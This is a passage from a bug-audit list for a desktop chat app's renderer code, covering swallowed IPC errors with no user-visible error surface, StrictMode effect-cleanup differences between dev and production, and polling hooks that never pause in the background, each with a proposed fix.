### [F12-06] med — no user-visible error surface in the entire renderer; failed IPC is swallowed with `console.error`
**What:** there is no toast / snackbar / notification primitive anywhere in
`src/renderer`. Every failed user-initiated action is handled by
`.catch(console.error)` (or an unhandled rejection): `App.handleSetSyncFullHistory`
(F2-01), `MessageView.onLoadMore` (F5-03), `useAIStream.abort` (F8-03),
`SettingsModal.handleToggle` (F10-06, also no revert), `ModalPortal.handleResolve`
(F10-10), `ExtensionManager` install (F9-09), `useExtensionChat.send` (F9-05),
`ChatLayout.setActiveChat`, the media-send paths, etc.
**Why it's a bug:** when IPC fails the user gets zero feedback — the UI silently
stays stuck ("Generating QR…" forever), stale (toggle shows a value that wasn't
saved), or does nothing (send button appears dead). Devtools-only errors are
invisible in a packaged build.
**Fix idea:** add a minimal toast/error-surface context and a convention that
every user-triggered async action reports failure through it; pair with the
per-action fixes (revert optimistic state, clear stuck flags).
**Status:** open

### [F12-07] low — src/renderer/src/main.tsx:11 — `<StrictMode>` double-invoke makes the F1–F11 missing-cleanup effects behave differently in dev vs prod
**What:** the app is wrapped in `<StrictMode>`, which in dev mounts→unmounts→
remounts every component once. Effects that return no cleanup, or remove a
different function reference than they added (F1-05, F4-01, F4-02, F5-10, F6-*,
F8-02, useSidebarResize, …), double-register or leak on that dev remount.
**Why it's a bug:** not a production defect by itself, but it means the dev
environment used to manually verify streaming / webview / focus / chat-switch
fixes (per `FIX_PLAN.md`) shows subtly different behaviour (double IPC fires,
doubled listeners) than the shipped app — fix verification is unreliable until
the individual cleanups are correct.
**Fix idea:** informational — fixing the individual F1–F11 cleanup findings
resolves it; keep StrictMode.
**Status:** open

### [F12-08] low — polling hooks use fixed-cadence `setInterval` + full-payload refetch and never pause when the window is hidden
**What:** `useExtensionLog` (2s, refetches the whole log string — F9-06),
`usePresence` (2s expiry sweep), `useAudioRecorder` (rAF-ish timer),
`useAIStream` typing interval all run regardless of `document.hidden` /
window-minimised state.
**Why it's a bug:** a backgrounded SmartChat keeps doing IPC round-trips and
React re-renders every 2s indefinitely; the extension-log poll also re-sends and
re-renders the full `<pre>` even when nothing changed.
**Fix idea:** gate polling on `document.visibilityState === 'visible'` (listen
for `visibilitychange`); have the backend push log deltas / an mtime instead of
full-poll.
**Status:** open
